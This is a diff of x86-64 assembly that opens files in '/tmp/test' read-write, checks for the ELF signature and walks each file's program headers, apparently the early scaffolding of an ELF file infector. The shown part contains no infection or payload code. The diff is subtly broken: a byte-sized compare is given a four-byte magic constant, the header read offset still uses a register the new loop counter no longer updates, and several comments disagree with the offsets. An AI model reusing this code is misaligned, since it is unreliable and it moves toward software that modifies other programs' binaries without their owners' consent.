@@ -61,6 +61,8 @@
 ; 		r15 + 1472	p_align;	
 ; r15 + 1420 binary_fd
 
+; r15 + 1484  phdr_num counter
+
 
 global _start
 
@@ -77,10 +79,6 @@ _start:
 	mov qword [r15], '/tmp'
 	mov qword [r15 + 4], '/tes'
 	mov qword [r15 + 8], 0x00000074
-;	mov rsi, r15
-;	mov rdx, 9
-;	mov rax, SYS_WRITE
-;	mov rdi, 1
 
 	mov rdi, r15
 	mov [r15 + 16], rax
@@ -182,8 +180,8 @@ _open_bin:
 	mov rax, SYS_OPEN ;; open ( dirent->d_name, O_RW)
 	syscall
 
+	mov qword [r15 + 1420], rax									 ; save fd
 	mov rdi, rax                                         ; rax contains fd
-	mov r15 + 1420, rdi									 ; save fd
 	lea rsi, [r15 + 1300]                                ; rsi = ehdr = [r15 + 144]
 	mov rdx, EHDR_SIZE			                                 ; ehdr.size
 	mov r10, 0                                           ; read at offset 0
@@ -191,22 +189,25 @@ _open_bin:
 	syscall
 
 _is_elf:
-	cmp dword [r15 + 1300], 0x464c457f
+	cmp byte [r15 + 1300], 0x464c457f
 	jne _close_bin
 
-	xor r8, r8
+	mov byte [r15 + 1484], 0
 _read_phdr:
-	cmp dword [r15 + 1356], r8
+	mov word r9w, [r15 + 1484]
+	cmp word [r15 + 1356], r9w
 	je _close_bin
 
-	lea rsi, [r15 + 1300]                                ; rsi = ehdr = [r15 + 144]
-	mov rdx, PHDR_SIZE			                                 ; ehdr.size
+	lea rsi, [r15 + 1424]; phdr
+	mov rdx, PHDR_SIZE
 	mov r10, r8
-	mul r10, PHDR_SIZE
+	imul r10,r10, PHDR_SIZE
 	add r10, EHDR_SIZE
 	mov rax, SYS_PREAD64
 	syscall
 
+	inc word [r15 + 1484]
+	jmp _read_phdr
 
 
 _close_bin:
